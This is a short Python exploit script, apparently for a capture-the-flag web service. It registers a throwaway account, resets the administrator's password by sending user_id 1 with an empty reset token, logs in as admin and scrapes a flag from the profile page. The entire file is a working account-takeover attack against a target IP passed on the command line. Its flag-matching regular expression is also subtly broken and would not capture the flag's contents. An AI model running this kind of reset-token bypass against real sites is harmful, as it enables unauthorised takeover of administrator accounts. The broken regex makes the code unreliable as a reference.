import random
import string
import requests
import sys
import re

IP = sys.argv[1]
PORT = 10165

s = requests.Session()

def generate_random_string_general(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choices(characters, k=length))

def generate_random_mail(length):
    domains = ["@mail.com", "@gmail.com", "@yandex.ru", "@redcadets.ru"]
    characters = string.ascii_letters + string.digits
    username = ''.join(random.choices(characters, k=length))
    domain = random.choice(domains) 
    return username + domain

def register(username, email, password):
    headers = {'Content-Type': 'application/json'}
    data = {
        "name": username,
        "email": email,
        "password": password
        }
    
    res = s.post(f"http://{IP}:{PORT}/api/auth/signup", headers=headers, json=data)
    assert res.status_code == 200 
    return "Register successfully"

def login(username, password):
    headers = {'Content-Type': 'application/json'}
    data = {
        "name": username,
        "password": password
        }
    res = s.post(f"http://{IP}:{PORT}/api/auth/signin", headers=headers, json=data)
    assert res.status_code == 200
    return res.text

def reset_admin_password(new_password):
    headers = {'Content-Type': 'application/json'}
    data = {
        "user_id": 1,
        "new_password": new_password, 
        "token": ""
        }
    res = s.post(f"http://{IP}:{PORT}/api/reset_password/confirm",headers=headers, json=data)
    assert res.status_code == 200 
    return new_password

def get_profile():
    res = s.get(f"http://{IP}:{PORT}/api/profile")
    return res.text

if __name__ == '__main__':
    username = generate_random_string_general(5)
    email = generate_random_mail(5)
    password = generate_random_string_general(5)

    register(username, email, password)
    login(username, password)
    new_admin_password = reset_admin_password(password)
    login("admin", new_admin_password)
    flag = re.findall(r"vka\{*+", get_profile())
     
    if flag:
        print("Flag found:", flag[0])
    else:
        print("Flag not found")
